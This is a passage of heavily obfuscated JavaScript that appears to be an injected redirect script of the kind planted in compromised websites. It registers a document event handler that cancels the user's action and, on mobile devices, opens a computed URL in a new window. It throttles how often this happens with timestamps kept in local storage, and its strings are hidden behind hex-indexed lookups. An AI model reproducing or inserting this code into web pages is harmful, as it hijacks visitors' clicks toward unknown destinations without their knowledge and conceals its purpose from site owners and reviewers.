Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());